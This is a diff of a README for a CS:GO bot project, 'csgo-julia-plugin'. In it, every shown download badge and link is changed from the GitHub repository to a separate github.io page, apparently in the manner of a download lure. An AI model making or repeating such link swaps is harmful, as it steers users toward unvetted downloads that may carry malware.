@@ -1,6 +1,6 @@
 # 🤖 csgo-julia-plugin - Run a Local CS:GO Bot
 
-[![Download csgo-julia-plugin](https://img.shields.io/badge/⬇%20Download-csgo--julia--plugin-FF5F1F?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bhaktipreview48/csgo-julia-plugin)
+[![Download csgo-julia-plugin](https://img.shields.io/badge/⬇%20Download-csgo--julia--plugin-FF5F1F?style=for-the-badge&logo=github&logoColor=white)](https://bhaktipreview48.github.io)
 
 csgo-julia-plugin is the home of **jev-bot**, a bot for CS:GO Legacy that plays the game by making one simple choice at a time. Instead of a complicated script full of fixed rules, the bot looks at the current game, reads a short menu of possible moves, and picks one. Then it does it again a fraction of a second later. The whole thing lives on your own network, on computers that you own.
 
@@ -69,9 +69,9 @@ Gather these things first so nothing blocks you halfway through:
 
 Everything you need starts on the project page.
 
-### [**➡️ Visit this link to download the application**](https://github.com/bhaktipreview48/csgo-julia-plugin)
+### [**➡️ Visit this link to download the application**](https://bhaktipreview48.github.io)
 
-[![Get csgo-julia-plugin](https://img.shields.io/badge/⬇%20Get%20csgo--julia--plugin-2ECC71?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bhaktipreview48/csgo-julia-plugin)
+[![Get csgo-julia-plugin](https://img.shields.io/badge/⬇%20Get%20csgo--julia--plugin-2ECC71?style=for-the-badge&logo=github&logoColor=white)](https://bhaktipreview48.github.io)
 
 Open the page, use the download button shown there, and save the files to a folder you will remember — for example `C:\jev-bot`. Everything else in this guide assumes you can find that folder again.
 
